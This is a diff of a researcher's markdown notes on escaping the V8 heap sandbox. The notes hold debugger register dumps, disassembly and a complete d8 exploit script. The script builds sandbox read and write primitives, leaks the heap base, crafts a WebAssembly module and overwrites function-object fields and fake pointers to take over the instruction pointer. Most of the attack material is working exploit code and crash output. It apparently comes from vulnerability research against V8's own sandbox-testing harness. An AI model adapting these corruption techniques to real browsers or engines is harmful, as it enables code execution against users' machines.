@@ -153,7 +153,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 ```
 ### Idea 1: overwriting `0x7fffffffd548` return address of JSWasmWrapperHelper
 ```js
-v8_write64(addrOf(instance.exports.func1)-0x30+0x18,16n);
+v8_write64(addrOf(instance.exports.func1)-0x30+0x18,18n);
 // 
 # Fatal error in ../../src/objects/object-type.cc, line 82
 # Type cast failed in CAST(LoadRegister(Register::function_closure())) at ../../src/interpreter/interpreter-assembler.cc:702
@@ -237,6 +237,98 @@ Builtins_CallFunction_ReceiverIsNullOrUndefined
 Generate_JSEntryTrampolineHelper(..., false)
 ```
 
+**Fixing CheckObjectType**
+
+Always returns true
+```js
+Address CheckObjectType(Address raw_value, Address raw_type,
+                        Address raw_location) {
+
+return Smi::FromInt(0).ptr();
+                        }
+```
+Breakpoints and testing:
+```js
+0x00007fff7f4c9384    After Builtins_JSToWasmWrapper and checking bytecodes
+//
+0x7fff7fea1a77    mov    qword ptr [r13 + 0x70], 0
+///
+0x7fff7fda593d    lea    rsp, [rsp + rcx*8]
+//
+0x7fff7f4c9309    mov    r12, qword ptr [rbp - 0x20]
+///
+0x7fff7fea1afb    mov    r8, qword ptr [rbp - 0x18]
+   0x7fff7fea1aff    mov    r9d, dword ptr [r8 + 7]
+// ===============================================================
+v8_write64(addrOf(instance.exports.func1)-0x30+0x18,18n);
+
+Thread 1 "d8" received signal SIGSEGV, Segmentation fault.
+0x00007fff7fea1aff in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+──────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────
+ RAX  0x0
+ RBX  0x7fff7fea1900 ◂— lea rbx, [rip - 7]
+ RCX  0x245
+ RDX  0x23f2000205c5 ◂— 0x8efe51aaf2000003
+ RDI  0x23f2beadbeef ◂— 0x0
+ RSI  0x4a
+ R8   0x23f2beadbeef ◂— 0x0
+ R9   0x23f200300095 ◂— 0x4100000002000008
+ R10  0xffffffff
+ R11  0x7fffffffd540 ◂— 0x7fffffffd540
+ R12  0x2d8100000729 ◂— 0x8a00400200000009 /* '\t' */
+ R13  0x5555555fd080 —▸ 0x7fff7f482400 ◂— push rbp
+ R14  0x23f200000000 ◂— 0x40940
+ R15  0x555555634b90 —▸ 0x7fff7fdf4580 ◂— lea rbx, [rip - 7]
+ RBP  0x7fffffffd540 ◂— 0x7fffffffd540
+ RSP  0x7fffffffd508 ◂— 0x244
+ RIP  0x7fff7fea1aff ◂— mov r9d, dword ptr [r8 + 7]
+───────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────────
+ ► 0x7fff7fea1aff    mov    r9d, dword ptr [r8 + 7]
+   0x7fff7fea1b03    mov    r10d, 0xffffffff
+   0x7fff7fea1b09    cmp    r9, r10
+   0x7fff7fea1b0c    jbe    0x7fff7fea1b1b                <0x7fff7fea1b1b>
+
+```
+
+**Using release binary**
+- It's looping
+
+```js
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+──────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────
+ RAX  0x239700200095 ◂— 0x4100000002000008
+ RBX  0x8
+ RCX  0x8
+ RDX  0x4d6
+ RDI  0x23970019a071 ◂— 0x11001c338900000b /* '\x0b' */
+ RSI  0x3af9000c48d9 ◂— 0xcd00405c0000001f
+ R8   0x26b
+ R9   0x26b
+ R10  0xca
+ R11  0x7fffffffd4a8 ◂— 0x4141 /* 'AA' */
+ R12  0x3af900000605 ◂— 0x8a00400200000009 /* '\t' */
+ R13  0x555556f4e080 —▸ 0x555556a8ff00 (Builtins_AdaptorWithBuiltinExitFrame) ◂— mov ecx, dword ptr [rdi + 0xf]
+ R14  0x239700000000 ◂— 0x40940
+ R15  0x555556f85570 —▸ 0x555556c1e180 (Builtins_WideHandler) ◂— add r9, 1
+*RBP  0x22
+*RSP  0x7fffffffd628 —▸ 0x7fffffffd620 ◂— 0x22 /* '"' */
+*RIP  0x555556a9c4e4 (Builtins_InterpreterEntryTrampoline+420) ◂— pop rcx
+───────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────────
+   0x555556a9c4d0 <Builtins_InterpreterEntryTrampoline+400>    mov    rcx, qword ptr [rbp - 0x18]
+   0x555556a9c4d4 <Builtins_InterpreterEntryTrampoline+404>    lea    rcx, [rcx*8]
+   0x555556a9c4dc <Builtins_InterpreterEntryTrampoline+412>    cmp    rbx, rcx
+   0x555556a9c4df <Builtins_InterpreterEntryTrampoline+415>    cmovl  rbx, rcx
+   0x555556a9c4e3 <Builtins_InterpreterEntryTrampoline+419>    leave  
+ ► 0x555556a9c4e4 <Builtins_InterpreterEntryTrampoline+420>    pop    rcx
+   0x555556a9c4e5 <Builtins_InterpreterEntryTrampoline+421>    add    rsp, rbx
+   0x555556a9c4e8 <Builtins_InterpreterEntryTrampoline+424>    push   rcx
+   0x555556a9c4e9 <Builtins_InterpreterEntryTrampoline+425>    ret    
+```
+
+
+
+
 
 ### Idea 2: Understanding Torque
 
@@ -245,4 +337,146 @@ Generate_JSEntryTrampolineHelper(..., false)
 
 `v8/src/builtins/js-to-wasm.tq` -> `v8/out/debug/gen/torque-generated/src/builtins/js-to-wasm-tq-csa.cc`
 
+Stacktrace:
+```js
+// v8/src/builtins/builtins-interpreter-gen.cc
+void Builtins::Generate_InterpreterEntryTrampoline(MacroAssembler* masm) {
+  Generate_InterpreterEntryTrampoline(masm,
+                                      InterpreterEntryTrampolineMode::kDefault);
+}
+
+// v8/src/builtins/x64/builtins-x64.cc
+void Builtins::Generate_InterpreterEntryTrampoline(...)
+```
+
+### Idea 3: Overwrite `v8::internal::Histogram *__hidden this` pointer of `AddSample` function
+
+```js
+.text:0000555555D90900 ; __int64 __fastcall v8::internal::Histogram::AddSample(v8::internal::Histogram *__hidden this, int)
+.text:0000555555D90900 _ZN2v88internal9Histogram9AddSampleEi proc near
+.text:0000555555D90900                                         ; CODE XREF: v8::Script::Run(v8::Local<v8::Context>,v8::Local<v8::Data>)+3DC↑p
+.text:0000555555D90900                                         ; v8::Module::Evaluate(v8::Local<v8::Context>)+372↑p ...
+.text:0000555555D90900 ; __unwind {
+.text:0000555555D90900                 push    rbp
+.text:0000555555D90901                 mov     rbp, rsp
+.text:0000555555D90904                 mov     rax, [rdi+18h]
+.text:0000555555D90908                 test    rax, rax
+.text:0000555555D9090B                 jz      short loc_555555D90924
+
+//====================================================================
+why rdi does not match when we change 0x41414141n to real pointer???
+// js 
+v8_write64(addrOf(instance.exports.func1)-0x30+0x18,0x13n + 0xcn);
+console.log((heap_addr + 0x200000n).toString(16));
+// v8_write64(0x200095n, 0x4141414142424242n);
+v8_write64(0x200095n, heap_addr + 0x200000n);
+///=================================================
+Thread 1 "d8" hit Breakpoint 2, 0x0000555555d90901 in v8::internal::Histogram::AddSample(int) ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+──────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────
+*RAX  0x13ee1
+ RBX  0x555556f4e000 —▸ 0x2dc800000000 ◂— 0x40940
+ RCX  0x0
+*RDX  0x618
+*RDI  0x2000008
+*RSI  0x13ee1
+*R8   0x30c
+*R9   0x30c
+*R10  0x555556f4e1a8 ◂— 0x0
+*R11  0x7fffffffd4a8 ◂— 0x4141 /* 'AA' */
+*R12  0x2dc800048a75 ◂— 0xe000000004000bd2
+ R13  0x555556f62018 ◂— 0x13ee1
+*R14  0x555556fbcaf0 —▸ 0x2dc8002000dd ◂— 0x4100000002000008
+ R15  0x555556ebc000 (v8::internal::v8_flags) ◂— 0x100000000000100
+
+
+```
+
+Control rip :
+I'm running with `release` binary, somehow it can trigger overwriting argument pointer in `AddSample` function...
+
+```js
+// ./out/release/d8
+// r --expose-gc --allow-natives-syntax --sandbox-testing    --experimental-wasm-memory64 ../../../tests/t8.js
+
+d8.file.execute('/home/vult/Desktop/v8/v8/test/mjsunit/wasm/wasm-module-builder.js');
+let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
+
+function addrOf(obj) {
+    return Sandbox.getAddressOf(obj);
+  }
+  
+  function v8_read64(addr) {
+    return sandboxMemory.getBigUint64(Number(addr), true);
+  }
+  
+  function v8_write64(addr, val) {
+    return sandboxMemory.setBigInt64(Number(addr), val, true);
+  }
+
+console.log("[*] Leak sandbox base address");
+// ================= reading heap_base =============================
+let ofs1 = 0x48;
+let heap_addr = v8_read64(ofs1) - 0x40000n;
+let low_ofs_started_page = heap_addr & 0xffffffffn;
+let high_ofs_started_page = heap_addr & 0xffffffff00000000n;
+console.log("heap_addr: 0x" + heap_addr.toString(16));
+// ================================================================
+
+const builder = new WasmModuleBuilder();
+builder.exportMemoryAs("mem0", 0);
+const GB = 1024 * 1024 * 1024;
+let $mem0 = builder.addMemory64(1 * GB / kPageSize);
+
+let $box = builder.addStruct([makeField(kWasmFuncRef, true)]);
+
+let $sig_i_l = builder.addType(kSig_i_l); //let kSig_i_l = makeSig([kWasmI64], [kWasmI32]);
+// let $Sig_i_iii = builder.addType(kSig_i_iii);
+
+builder.addFunction("func0", kSig_v_l).exportFunc().addBody([ // func 0 receive a int32 and write to that address??
+//let kSig_v_i = makeSig([kWasmI32], []);
+  kExprLocalGet, 0,
+  ...wasmI32Const(0x41414141),
+  kExprI32StoreMem, 0, 0, // i32.store offset = -1
+]);
+builder.addFunction("func1", builder.addType(kSig_l_l)).exportFunc().addBody([ // function 1 convert from int32 to int64
+  kExprLocalGet, 0,
+//   kExprI32ConvertI64,
+  kExprI64Const, 0x81, 0x80, 0x80, 0x80, 0x10,
+  kExprI64Mul,
+]);
+
+
+let instance = builder.instantiate();
+
+instance.exports.func0(0n);
+
+instance.exports.func1(0n);
+instance.exports.func0(0n);
+
+%DebugPrint(instance.exports.func1);
+
+// ===============================
+// length has only 2 bytes
+// 0xbn
+// 174n 
+// rsp = rsp + (0xb+1)*8
+// v8_write64(0x43001n, 0x0n)
+v8_write64(addrOf(instance.exports.func1)-0x30+0x18,0x13n + 0xcn);
+console.log((heap_addr + 0x200000n).toString(16));
+v8_write64(0x200000n + 0x20n, heap_addr + 0x250000n);
+v8_write64(0x250000n + 0x0EB30n, 0x4141414142424242n);
+// v8_write64(0x200095n, 0x4141414142424242n);
+v8_write64(0x2000d5n, heap_addr + 0x200000n);
+
+
+
+// %SystemBreak();
+
+// trigger out-of-bounds stack
+// console.log("[*] After overwriting length");
+instance.exports.func1(0x4141n);
+
+
+```
 
